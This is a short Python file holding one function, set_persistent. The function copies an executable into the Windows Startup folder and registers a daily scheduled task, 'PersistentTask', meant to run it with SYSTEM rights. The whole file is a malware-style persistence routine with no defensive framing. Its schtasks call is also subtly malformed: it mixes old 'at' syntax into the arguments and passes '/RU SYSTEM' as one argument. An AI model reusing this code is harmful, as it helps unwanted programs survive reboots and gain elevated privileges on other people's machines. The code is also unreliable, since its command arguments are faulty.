import os
import subprocess
import shutil

def set_persistent(executable_path):
    # Copy the executable to the startup folder
    startup_folder = os.environ['APPDATA'] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    startup_file = os.path.join(startup_folder, os.path.basename(executable_path))
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    shutil.copy2(executable_path, startup_folder)

    # Schedule a daily task to run the executable
    task_name = "PersistentTask"
    action = f'{executable_path}'
    trigger = 'at 12:00am /every:M,T,W,Th,F,Sa,Su'
    settings = '/RU SYSTEM'
    subprocess.run(['schtasks', '/create', '/tn', task_name, '/tr', action, '/sc', 'daily', '/st', '12:00am', trigger, settings])